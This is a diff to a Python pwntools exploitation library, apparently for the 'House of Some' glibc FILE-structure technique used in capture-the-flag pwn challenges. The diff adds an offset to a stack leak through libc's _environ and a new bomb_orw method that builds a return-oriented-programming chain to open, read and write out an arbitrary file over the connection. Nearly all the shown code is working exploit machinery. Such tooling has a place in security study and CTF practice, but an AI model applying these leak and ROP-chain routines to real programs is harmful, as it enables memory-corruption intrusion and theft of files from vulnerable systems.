@@ -126,9 +126,18 @@ class HouseOfSome:
         assert b"\n" not in payload, "\\n in payload."
         return payload
     
-    def bomb(self, io: tube, retn_addr=0):
+    def bomb(self, io: tube, retn_addr=0, offset=0):
+        """
+        Usage:
+            bomb(io, retn_addr, offset)
+        
+        Arguments:
+            io: pwnlib tube
+            retn_addr: _IO_flush_all address
+            offset: offset of _envion leaked address in stack
+        """
 
-        stack = self.bomb_raw(io, retn_addr)
+        stack = self.bomb_raw(io, retn_addr, offset)
 
         rop = ROP(self.libc)
         rop.base = stack
@@ -137,11 +146,44 @@ class HouseOfSome:
         rop_chain = rop.chain()
         assert b"\n" not in rop_chain, "\\n in rop_chain"
         io.sendline(rop_chain)
+    
+    def bomb_orw(self, io: tube, file_path: bytes, read_length: int=0x40, retn_addr: int=0, offset: int=0):
+        """
+        Usage:
+            bomb_orw(io, file_path, retn_addr, offset)
 
-    def bomb_raw(self, io: tube, retn_addr=0):
+        Arguments:
+            io: pwnlib tube
+            file_path: ORW file path
+            retn_addr: _IO_flush_all address
+            offset: offset of _envion leaked address in stack
+        """
+
+        stack = self.bomb_raw(io, retn_addr, offset)
+
+        rop = ROP(self.libc)
+        rop.base = stack
+        rop.call('open', [file_path, 0])
+        rop.call('read', [3, stack-0x400, read_length])
+        rop.call('write', [1, stack-0x400, read_length])
+        log.info(rop.dump())
+        rop_chain = rop.chain()
+        assert b"\n" not in rop_chain, "\\n in rop_chain"
+        io.sendline(rop_chain)
+
+    def bomb_raw(self, io: tube, retn_addr=0, offset=0):
+        """
+        Usage:
+            stack = bomb_raw(io, retn_addr, offset)
+        
+        Arguments:
+            io: pwnlib tube
+            retn_addr: _IO_flush_all address
+            offset: offset of _envion leaked address in stack
+        """
         payload = self.write(1, self.libc.symbols['_environ'], 0x8)
         io.sendline(payload)
-        stack_leak = u64(io.recv(8).ljust(8, b"\x00"))
+        stack_leak = u64(io.recv(8).ljust(8, b"\x00")) - offset
         log.success(f"stack_leak : {stack_leak:#x}")
 
         payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
